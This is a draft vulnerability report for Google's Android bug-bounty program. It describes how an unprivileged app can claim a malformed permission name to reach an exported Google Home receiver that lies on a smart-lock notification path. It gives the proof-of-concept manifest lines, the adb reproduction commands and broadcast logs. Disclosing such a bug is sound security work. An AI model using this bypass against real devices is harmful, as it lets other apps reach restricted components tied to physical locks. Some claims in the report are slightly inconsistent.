# Submission draft — Google Home: exported receiver guarded by a permission that cannot exist

Paste target: https://bughunters.google.com/report (Android / Mobile VRP)
Status: READY. Evidence is Android's own broadcast history, reproducible in one command.

---

**Title:**
Google Home: `LockProximityReceiver` is exported and guarded by a malformed
permission string, so any app can claim that name and invoke it

---

Testing date: 2026-10-21
Testing time: 13:18, 13:26 and 13:33 UTC (three runs)
Researcher IP: 180.148.212.54
Device: moto g stylus 5G (2024), Android 15 (API 35), stock, not rooted
App: com.google.android.apps.chromecast.app (Google Home), versionName=4.33.27.4
Tools: adb, jadx, aapt2, apksigner

---

## The bug

Google Home's manifest declares:

```xml
<receiver
    android:name="com.google.android.apps.chromecast.app.remotecontrol.safety.LockProximityReceiver"
    android:permission="android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN"
    android:exported="true">
    <intent-filter>
        <action android:name="com.google.android.apps.chromecast.app.remotecontrol.safety.action.BLE_SCANNED"/>
    </intent-filter>
</receiver>
```

`android:permission` takes one permission name. There are two here, joined with `|`.
Android does not split on `|`; it treats the whole string as a single permission name,
and no package on the device defines a permission called
`android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN`.

That breaks the guard in both directions:

Because no package defines that name, a third-party app can declare it itself at
`protectionLevel="normal"`, request it, and be granted it at install with no user prompt.
It then passes the check that every other unprivileged app fails.

I am deliberately not claiming anything about whether the receiver's intended deliveries
still work. Every `BLE_SCANNED` record in this device's broadcast history carries a
timestamp from my own test runs, and the account has no smart lock, so no legitimate
delivery was expected or observed. Reading the code, the app registers its scan callback
as a `PendingIntent`, which is dispatched under the app's own identity and so would not be
affected — but I did not test that, and I am not asserting it.

What I am asserting is only what the records show: the guard refuses ordinary apps, and an
app that declares the name itself is not refused.

## What I demonstrated

An app holding no real permissions can declare that name itself, be granted it at
install, and have its broadcast delivered to the receiver. An otherwise identical app
that does not declare it is refused by the system.

I built two APKs from the same source. The only difference is these two lines in one of
them:

```xml
<permission android:name="android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN"
            android:protectionLevel="normal" />
<uses-permission android:name="android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN" />
```

It is granted at install, with no prompt and no entry anywhere in the UI, because the
name is not a real permission:

```
$ adb shell dumpsys package com.cindrasec.mvrpprobe | grep -A3 'install permissions'
    install permissions:
      android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN: granted=true
```

Both apps then send the same broadcast: action
`com.google.android.apps.chromecast.app.remotecontrol.safety.action.BLE_SCANNED`,
component set to the receiver, extras `hgs_device_id`, `device_name`, `request_id` and a
one-element `ArrayList<ScanResult>` under `android.bluetooth.le.extra.LIST_SCAN_RESULT`.

The clearest evidence is Android's own broadcast history, which records the outcome and
the reason independently of anything either app logs. Both records below come from a
single `adb shell dumpsys activity broadcasts` taken after running each app once.

**App that declares the name — delivered, and the receiver ran:**

```
BroadcastRecord{6a3379c com.google.android.apps.chromecast.app.remotecontrol.safety.action.BLE_SCANNED/u0} to user 0
Intent { act=com.google.android.apps.chromecast.app.remotecontrol.safety.action.BLE_SCANNED
         flg=0x10 cmp=com.google.android.apps.chromecast.app/.remotecontrol.safety.LockProximityReceiver (has extras) }
caller=com.cindrasec.mvrpprobe 19321:com.cindrasec.mvrpprobe/u0a568 pid=19321 uid=10568
dispatchTime=-4s78ms (+1ms since enq) finishTime=-4s69ms (+9ms since disp)
DELIVERED scheduled +2ms terminal +8ms (-1) #0: (manifest)
  ActivityInfo:
    name=com.google.android.apps.chromecast.app.remotecontrol.safety.LockProximityReceiver
    packageName=com.google.android.apps.chromecast.app
    enabled=true exported=true directBootAware=false
    permission=android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN
  reason: remote app
```

**Identical app without the declaration — refused before dispatch:**

```
BroadcastRecord{5a4a12c com.google.android.apps.chromecast.app.remotecontrol.safety.action.BLE_SCANNED/u0} to user 0
Intent { act=com.google.android.apps.chromecast.app.remotecontrol.safety.action.BLE_SCANNED
         flg=0x10 cmp=com.google.android.apps.chromecast.app/.remotecontrol.safety.LockProximityReceiver (has extras) }
caller=com.cindrasec.mvrpctl 24061:com.cindrasec.mvrpctl/u0a569 pid=24061 uid=10569
SKIPPED terminal (-1) #0: (manifest)
  ActivityInfo:
    name=com.google.android.apps.chromecast.app.remotecontrol.safety.LockProximityReceiver
    permission=android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN
  reason: skipped by policy at enqueue: Permission Denial: broadcasting Intent {
    act=com.google.android.apps.chromecast.app.remotecontrol.safety.action.BLE_SCANNED flg=0x10
    cmp=com.google.android.apps.chromecast.app/.remotecontrol.safety.LockProximityReceiver (has extras) }
    from com.cindrasec.mvrpctl (pid=24061, uid=10569)
    to com.google.android.apps.chromecast.app/.remotecontrol.safety.LockProximityReceiver
    requires android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN
```

The system states the rule and the reason itself: the receiver requires that permission
name, the app that declared it passes, the app that did not is skipped at enqueue. The
declaration is the only difference between the two APKs.

Google Home's own process also logs a `BluetoothAdapter` line immediately after each
delivered broadcast — the Bluetooth check at the top of `onReceive` — and nothing after
the skipped ones. I repeated that comparison 15 times across three sessions, including a
third branch where nothing was sent at all, and the result was 15/15 for the app with the
declaration and 0/15 for both the control app and the silent branch.

## Where this entry point leads

The following is read from the decompiled app. It is not something I performed.

`onReceive` takes `hgs_device_id`, `device_name`, `request_id` and the scan-result list
straight out of the intent with no caller check of any kind, and when the list is
non-empty it enqueues work named `tln_send_unlock_notification_worker`.
`LockProximityNotificationWorker` resolves the device id against the signed-in account
and, for a device with a lock trait, posts a notification on channel
`tln_unlock_notification_channel_id` whose tap target is `LockProximityUnlockActivity`,
carrying `hgs_device_id`, `request_id` and `manufacturer_data` through from the
broadcast. That activity enqueues `LockProximityUnlockWorker`, whose body is the unlock
call.

I did not reach that path. In my testing the handler returns before the list branch, and
I do not have a smart lock on the test account, so I could not supply a device id that
resolves server side. `LockProximityUnlockActivity` is `android:exported="false"`, so the
unlock cannot be invoked directly and would still require the user to tap the
notification.

What I am reporting is the guard, not the unlock: a component you intended to restrict is
reachable by any app, and it sits on the path to a physical lock.

## Impact

An unprivileged app installed by the user can invoke an internal Google Home component
that the manifest intends to protect, and make the app execute code on data the attacker
supplies. No user interaction and no prompt. Nothing in the app's permission list would
look unusual to a reviewer either, since the declared name is not a real permission and
so does not appear as a capability anywhere in the UI.

## Reproduction

```
adb install -r probe.apk      # declares and requests the malformed name
adb install -r control.apk    # identical source, declares nothing

adb shell dumpsys package com.cindrasec.mvrpprobe | grep -A3 'install permissions'

# run each app once; each sends the broadcast described above
adb shell am start -n com.cindrasec.mvrpprobe/com.cindrasec.mvrpprobe.MainActivity --es action blescan
adb shell am start -n com.cindrasec.mvrpctl/com.cindrasec.mvrpprobe.MainActivity   --es action blescan

# then read the system's own record of both
adb shell dumpsys activity broadcasts | grep -B4 -A18 BLE_SCANNED
```

One record reads DELIVERED, the other SKIPPED with a Permission Denial naming the
malformed string. No logcat filtering, no timing, and nothing that depends on how the app
chooses to log.

Both APKs and their source are attached.

## Suggested fix

Replace the malformed attribute value with one real permission name, or drop
`android:permission` and check the caller inside `onReceive`. `android:permission` cannot
express "either of these two", so if that was the intent it has to live in code.

It would also be worth grepping the codebase for `android:permission` values containing
`|`. This kind of typo fails closed, so it looks like it is working — the feature quietly
stops receiving and the guard quietly stops guarding, and neither shows up in testing.

---

## Before sending

Take one screenshot of the terminal showing the `dumpsys activity broadcasts` output with
both records visible — the DELIVERED one and the SKIPPED one with its Permission Denial
reason. That single screen is the whole report.

Do not add a CVSS score argued upward. Do not describe the notification or the unlock as
something that happened. Every sentence above has a log line or a manifest line behind it,
and that is the only reason this is worth sending.
